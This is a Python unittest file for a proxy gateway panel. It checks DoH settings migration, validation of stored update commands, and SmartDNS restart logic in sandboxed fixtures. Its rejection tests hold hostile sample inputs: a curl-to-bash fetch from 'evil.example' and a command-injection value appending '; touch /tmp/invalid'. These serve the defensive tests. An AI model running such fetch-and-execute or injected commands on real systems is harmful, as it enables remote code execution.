"""DoH settings migration and SmartDNS reload checks in isolated fixtures."""
import base64
import copy
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import types
import unittest
from unittest.mock import patch

REPO = Path(__file__).resolve().parents[1]
HELPERS = REPO/'resource/client/ui-script'
broker = types.ModuleType('panel_broker')
exec(compile((HELPERS/'ui-panel').read_text(), 'ui-panel', 'exec'), broker.__dict__)


class DNSSettingsTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.file = self.root/'0conf'
        self.config = {'address': {'localIP': '10.0.0.1', 'upstreamIP': '10.0.0.2', 'PWD': 'a'*64},
                       'v2node': [{'domain': 'node.example', 'tls': 'node.example', 'name': 'Test',
                                   'uuid': '11111111-1111-4111-8111-111111111111', 'path': '/proxy'}],
                       'dns': {'DOH': ['node.example/dq'], 'xDNS': '', 'hosts': {}, 'china': '223.5.5.5'},
                       'update': {'updateCMD': 'bash <(curl -fsSL https://raw.githubusercontent.com/XDcooler/de_GWD/main/client)'}}
        self.params = {'DoH1': 'node.example/dq', 'DoH2': 'other.example:443/dq',
                       'xDNSc': '', 'dnsChina': '223.5.5.5', 'hostsCustomize': ''}
        self.file.write_text(json.dumps(self.config))
        self.file.chmod(0o600)

    def save_dns(self, config=None, params=None):
        with patch.object(broker, 'CONFIG', self.file), patch.object(broker, 'helper', return_value='') as helper, \
             patch.object(broker, 'run', return_value='') as run:
            broker.perform('saveDNS', params or self.params, copy.deepcopy(config or self.config))
            return helper.call_args_list, run.call_args_list

    def test_legacy_saved_command_is_migrated_when_doh_is_saved(self):
        helpers, calls = self.save_dns()
        saved = json.loads(self.file.read_text())
        self.assertEqual(saved['update']['updateCMD'], broker.UPDATE_CMD)
        self.assertEqual(saved['dns']['DOH'], ['node.example/dq', 'other.example:443/dq'])
        self.assertEqual(saved['v2node'], self.config['v2node'])
        self.assertEqual(saved['address'], self.config['address'])
        self.assertEqual([c.args for c in helpers], [('DNSsplit',), ('saveSmartDNS',)])
        self.assertEqual([c.args[0] for c in calls], [['/usr/bin/systemctl', 'restart', 'v2dns'],
                                                    ['/usr/bin/systemctl', 'restart', 'pihole-FTL']])
        self.assertEqual(self.file.stat().st_mode & 0o777, 0o600)

    def test_upstream_legacy_metadata_is_also_migrated(self):
        config = copy.deepcopy(self.config)
        config['update']['updateCMD'] = 'bash <(curl -fsSL https://raw.githubusercontent.com/jacyl4/de_GWD/main/client)'
        self.save_dns(config)
        self.assertEqual(json.loads(self.file.read_text())['update']['updateCMD'], broker.UPDATE_CMD)

    def test_current_command_is_preserved(self):
        config = copy.deepcopy(self.config); config['update']['updateCMD'] = broker.UPDATE_CMD
        self.save_dns(config)
        self.assertEqual(json.loads(self.file.read_text())['update']['updateCMD'], broker.UPDATE_CMD)

    def test_custom_or_injected_saved_commands_remain_rejected_before_side_effects(self):
        before = self.file.read_bytes()
        for value in ['bash <(curl -fsSL https://evil.example/client)',
                      self.config['update']['updateCMD']+'; touch /tmp/invalid',
                      self.config['update']['updateCMD'].replace('/main/', '/custom/'), [], None]:
            config = copy.deepcopy(self.config); config['update']['updateCMD'] = value
            with patch.object(broker, 'CONFIG', self.file), patch.object(broker, 'helper') as helper, \
                 patch.object(broker, 'run') as run, self.assertRaises(broker.Rejected):
                broker.perform('saveDNS', self.params, config)
            helper.assert_not_called(); run.assert_not_called()
            self.assertEqual(self.file.read_bytes(), before)

    def test_snapshot_normalizes_metadata_without_writing_disk(self):
        before = self.file.read_bytes()
        result = broker.perform('snapshot', {}, copy.deepcopy(self.config))
        self.assertEqual(result['update']['updateCMD'], broker.UPDATE_CMD)
        self.assertEqual(self.file.read_bytes(), before)

    def test_restore_migrates_known_metadata_but_does_not_download_or_execute_it(self):
        payload = base64.b64encode(json.dumps(self.config).encode()).decode()
        with patch.object(broker, 'CONFIG', self.file), patch.object(broker, 'helper', return_value='') as helper, \
             patch.object(broker, 'update_download') as download:
            broker.perform('restore', {'data': payload}, {})
        download.assert_not_called(); helper.assert_called_once_with('restore')
        self.assertEqual(json.loads(self.file.read_text())['update']['updateCMD'], broker.UPDATE_CMD)

    def test_browser_submitted_legacy_or_custom_update_command_is_not_accepted(self):
        for value in [self.config['update']['updateCMD'], 'bash <(curl -fsSL https://evil.example/client)']:
            with patch.object(broker, 'update_download') as download, self.assertRaises(broker.Rejected):
                broker.perform('updateSave', {'updateCMD': value}, copy.deepcopy(self.config))
            download.assert_not_called()

    def test_invalid_doh_is_rejected_before_disk_or_services_change(self):
        params = dict(self.params, DoH1='https://node.example/dq')
        before = self.file.read_bytes()
        with self.assertRaises(broker.Rejected): self.save_dns(params=params)
        self.assertEqual(self.file.read_bytes(), before)


@unittest.skipUnless(sys.platform.startswith('linux') and shutil.which('jq') and shutil.which('sha256sum'),
                     'SmartDNS fixture requires Linux GNU utilities and jq')
class SmartDNSReloadTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.gateway = self.root/'gateway'; self.gateway.mkdir()
        self.smart = self.root/'smartdns'; self.smart.mkdir()
        self.bin = self.root/'bin'; self.bin.mkdir()
        self.events = self.root/'events'
        self.config = self.gateway/'0conf'
        self.config.write_text(json.dumps({'dns': {'DOH': ['node.example:8443/dq'], 'china': '223.5.5.5', 'xDNS': ''}}))
        (self.smart/'smartdns.conf').write_text('bind :5310\nserve-expired-reply-ttl 4\n\nserver 223.5.5.5\n'
            'server-https https://198.51.100.8/dq -host-name node.example -exclude-default-group -group xDNS\n')
        script = (HELPERS/'ui-saveSmartDNS').read_text().replace('/opt/de_GWD', str(self.gateway)).replace('/etc/smartdns', str(self.smart))
        self.script = self.root/'saveSmartDNS'; self.script.write_text(script)
        (self.bin/'dig').write_text('#!/bin/bash\necho 198.51.100.8\n')
        (self.bin/'ipset').write_text('#!/bin/bash\ncat >/dev/null\n')
        (self.bin/'systemctl').write_text('''#!/bin/bash
echo "$*" >> "$EVENTS"
if [[ $1 == restart && $2 == smartdns && ${FAIL_RESTART:-0} == 1 ]]; then exit 1; fi
if [[ $1 == is-active && $3 == smartdns && ${INACTIVE:-0} == 1 ]]; then exit 3; fi
exit 0
''')
        for file in self.bin.iterdir(): file.chmod(0o755)

    def run_helper(self, **env):
        return subprocess.run(['bash', str(self.script)], capture_output=True, text=True, timeout=15,
                              env=dict(os.environ, PATH=str(self.bin)+os.pathsep+os.environ['PATH'], EVENTS=str(self.events), **env))

    def test_same_ip_with_changed_port_restarts_smartdns(self):
        result = self.run_helper(); self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('https://198.51.100.8:8443/dq', (self.smart/'smartdns.conf').read_text())
        self.assertIn('restart smartdns', self.events.read_text())

    def test_same_ip_with_changed_sni_restarts_smartdns(self):
        config = json.loads(self.config.read_text()); config['dns']['DOH'] = ['other.example/dq']
        self.config.write_text(json.dumps(config))
        result = self.run_helper(); self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('-host-name other.example', (self.smart/'smartdns.conf').read_text())
        self.assertIn('restart smartdns', self.events.read_text())

    def test_unchanged_bytes_do_not_restart_active_smartdns(self):
        self.assertEqual(self.run_helper().returncode, 0)
        self.events.write_text('')
        result = self.run_helper(); self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn('restart smartdns', self.events.read_text())

    def test_failed_restart_is_not_masked_by_later_ipset_success(self):
        self.assertNotEqual(self.run_helper(FAIL_RESTART='1').returncode, 0)


if __name__ == '__main__':
    unittest.main()
